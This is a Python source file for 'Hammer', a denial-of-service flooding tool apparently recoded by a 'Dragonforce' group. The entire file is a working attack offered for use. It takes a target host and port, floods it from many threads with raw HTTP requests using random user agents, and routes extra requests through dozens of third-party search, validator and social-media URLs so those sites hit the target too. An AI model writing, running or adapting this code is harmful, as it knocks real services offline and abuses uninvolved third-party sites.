from queue import Queue
from optparse import OptionParser
import time
import sys
import socket
import threading
import logging
import urllib.request
import random
import os
from pystyle import Colorate, Colors, Center
from colorama import init, Fore as cc

init()
g = G = cc.RED

def user_agent():
    global uagent
    uagent = []
    with open("user-agents.txt", "r") as file:
        uagent = [line.strip() for line in file]
    return uagent

def my_bots():
    global bots
    bots = []
    bots.append("http://validator.w3.org/check?uri=")
    bots.append("http://www.facebook.com/sharer/sharer.php?u=")
    bots.append("http://engadget.search.aol.com/search?q=")
    bots.append("http://www.usatoday.com/search/results?q=")
    bots.append("http://www.google.com/?q=")
    bots.append("http://www.bing.com/search?q=")
    bots.append("https://www.yandex.com/yandsearch?text=")
    bots.append("https://duckduckgo.com/?q=")
    bots.append("http://www.ask.com/web?q=")
    bots.append("http://search.aol.com/aol/search?q=")
    bots.append("https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term")
    bots.append("https://drive.google.com/viewerng/viewer?url=")
    bots.append("http://validator.w3.org/feed/check.cgi?url=")
    bots.append("http://host-tracker.com/check_page/?furl=")
    bots.append("http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=")
    bots.append("http://jigsaw.w3.org/css-validator/validator?uri=")
    bots.append("https://add.my.yahoo.com/rss?url=")
    bots.append("http://www.google.com/?q=")
    bots.append("http://www.usatoday.com/search/results?q=")
    bots.append("http://engadget.search.aol.com/search?q=")
    bots.append("https://steamcommunity.com/market/search?q=")
    bots.append("http://www.topsiteminecraft.com/site/pinterest.com/search?q='")
    bots.append("http://eu.battle.net/wow/en/search?q=")
    bots.append("https://www.google.ae/search?q=")
    bots.append("https://www.google.com.af/search?q=")
    bots.append("https://www.google.com.ag/search?q=")
    bots.append("https://www.google.com.ai/search?q=")
    bots.append("https://www.google.al/search?q=")
    bots.append("https://www.google.am/search?q=")
    bots.append("https://www.google.co.ao/search?q=")
    bots.append("https://steamcommunity.com/market/search?q=")
    bots.append("https://www.ted.com/search?q=")
    bots.append("https://play.google.com/store/search?q=")
    bots.append("https://www.qwant.com/search?q=")
    bots.append("https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=")
    bots.append("https://www.google.ad/search?q=")
    bots.append("https://www.youtube.com/")
    bots.append("https://check-host.net/")
    bots.append("https://www.bing.com/search?q=")
    bots.append("https://r.search.yahoo.com/")
    bots.append("https://www.facebook.com/")
    bots.append("https://vk.com/profile.php?redirect=")
    bots.append("https://www.usatoday.com/search/results?q=")
    bots.append("https://help.baidu.com/searchResult?keywords=")
    bots.append("https://www.reddit.com/search?q=")
    bots.append("https://www.instagram.com/explore/tags/")
    bots.append("https://www.pinterest.com/search/pins/?q=")
    bots.append("https://www.linkedin.com/search/results/all/?keywords=")
    bots.append("https://www.tumblr.com/search/")
    bots.append("https://www.netflix.com/search?q=")
    bots.append("https://www.amazon.com/s?k=")
    bots.append("https://www.ebay.com/sch/i.html?_nkw=")

    return bots

hammer = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   
                          .    ..           
                         ..  .,'            
                      .',..':;.             
                    .';;'',:c;.             
                  .',,;:::;:c;','.          
                 .,'.;c:::::;,,;;:,         
              .   ..',,;:;'..;:;;c;         
              ...   ..,,,.  '::;cl,         
                     ..    .,::;,;.         
                   ..     .;lcc:,.          
                          .';'';'.          
                      ..,. .,''.            
                    ..,clc.';..             
                  ..;::ldo:;.               
                 ..;:;cdxxl'                
                ...,,':lcc'                 
                .  .,'clc,.                 
                ...::',,'..                 
             .  .,cc. ....                  
Hammer - Recoded by @Vip3rLi0n - @Dragonforce.io
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
os.system('cls' if os.name == 'nt' else 'clear')
print(Center.XCenter(Colorate.Vertical(Colors.red_to_blue, hammer, 2)))
print(f'{g}')
time.sleep(2)
os.system('cls' if os.name == 'nt' else 'clear')

def bot_hammering(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			print(f"Bot is working...")
			time.sleep(.1)
	except:
		time.sleep(.1)


def down_it(item):
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print (time.ctime(time.time())," <--Request sent to the target!--> ")
			else:
				s.shutdown(1)
				print("Shutting down!")
			time.sleep(.1)
	except socket.error as e:
		print("Connection to the server failed, maybe it got hammered hard?")
		time.sleep(.1)


def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()


def dos2():
	while True:
		item=w.get()
		bot_hammering(random.choice(bots)+"http://"+host)
		w.task_done()

def usage():
	print(f'''
   
    ______                              __                   
    |  _  \                            / _|                  
    | | | |_ __ __ _  __ _  ___  _ __ | |_ ___  _ __ ___ ___ 
    | | | | '__/ _` |/ _` |/ _ \| '_ \|  _/ _ \| '__/ __/ _ \\
    | |/ /| | | (_| | (_| | (_) | | | | || (_) | | | (_|  __/
    |___/ |_|  \__,_|\__, |\___/|_| |_|_| \___/|_|  \___\___|
	              __/ |                                  
                      |___/                                   
	     __ __  ____             ____            __      _ 
	  __/ // /_/ __ \____  _____/ __ )____ _____/ ____ _(_)
	 /_  _  __/ / / / __ \/ ___/ __  / __ `/ __  / __ `/ / 
	/_  _  __/ /_/ / /_/ (__  / /_/ / /_/ / /_/ / /_/ / /  
	 /_//_/  \____/ .___/____/_____/\__,_/\__,_/\__,_/_/   
	             /_/ Recoded by @Vip3r_Li0n - @Dragonforce.io
		
	            Usage : python tukul.py  [-s] [-p] [-t]
	               -s : The ip/hostname of the target 
	               -p : port (default 80)
	               -t : turbo (Depends on your Hardware. Mid is 120)          
	''')
	sys.exit()

def get_parameters():
	global host
	global port
	global thr
	global item
	optp = OptionParser(add_help_option=False,epilog="Hammers")
	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
	optp.add_option("-s","--server", dest="host",help="Hostname/IP of the target, -s ip")
	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 120 -t 120")
	optp.add_option("-h","--help",dest="help",action='store_true',help="help message")
	opts, args = optp.parse_args()
	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
	if opts.help:
		usage()
	if opts.host is not None:
		host = opts.host
	else:
		usage()
	if opts.port is None:
		port = 80
	else:
		port = opts.port
	if opts.turbo is None:
		thr = 120
	else:
		thr = opts.turbo


global data
headers = open("head.txt", "r")
data = headers.read()
headers.close()

q = Queue()
w = Queue()


if __name__ == '__main__':
	if len(sys.argv) < 2:
		usage()
	get_parameters()
	print("Target: ",host," Port: ",str(port)," Turbo: ",str(thr)," ")
	print(time.ctime(time.time())," Remaking tools, please wait.")
	user_agent()
	my_bots()
	time.sleep(3)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.settimeout(1)
	except socket.error as e:
		print("Check the target ip and port!")
		usage()
	while True:
		for i in range(int(thr)):
			t = threading.Thread(target=dos)
			t.daemon = True  
			t.start()
			t2 = threading.Thread(target=dos2)
			t2.daemon = True  
			t2.start()
		start = time.time()
		
		item = 0
		while True:
			if (item>1800): 
				item=0
				time.sleep(.1)
			item = item + 1
			q.put(item)
			w.put(item)
			q.join()
			w.join()